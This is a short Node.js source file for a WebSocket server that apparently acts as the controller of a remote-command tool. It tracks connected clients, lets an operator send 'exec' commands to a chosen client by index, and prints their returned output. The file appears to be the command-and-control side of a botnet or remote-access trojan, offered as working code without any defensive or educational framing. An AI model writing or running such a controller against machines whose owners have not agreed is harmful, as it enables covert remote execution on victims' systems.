const WS = require('ws')
const port = 6969
const wss = new WS.Server({ port })
const readline = require('readline')
const color = require("./colors")
let clients = []
console.log(`
   ${color.FgYellow}
    Menu :::\n${color.FgMagenta}
    [##] exec ${color.FgGreen} --> ${color.Bright} To execute the code in terminal console.log 
    ${color.FgMagenta}
    [##] client list${color.FgGreen} --> ${color.Bright} Shows the number of Clients.
    ${color.BgBlack}
`)
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
})
rl.on("line", msg => {
    if (clients.length > 0) {
        if (isNaN(msg.split(" ")[0]) != true) {
            try {
                clients[Number(msg.split(" ")[0])]?.send(msg)
            } catch (err) {
                console.log(`No client on ${Number(msg.split(" ")[0])}`)
            }
        }
    }
    if(msg === "client list")
    {
        console.log(`Total Clients: ${clients.length}`)
    }
    if(clients.length <= 0){
        console.log(`NO CLIENTS AVAILABLE`)
    }
})
wss.on("connection", (ws, req) => {
    console.log(`connected to ${req.socket.remoteAddress}`)
    clients.push(ws)
    ws.on("message", (message) => {
        console.log(`${color.FgCyan}`)
        console.log(message.toString())
        console.log(`${color.FgRed}`)

    })
    ws.on("close", () => {
        clients.splice(clients.indexOf(ws), 1)
        console.log(`${color.BgBlack}${color.FgRed}Client ${req.socket.remoteAddress} Disconnected.\nNumber Of Clients:${clients.length}${color.FgRed}`)
        ws.close()
    })
})

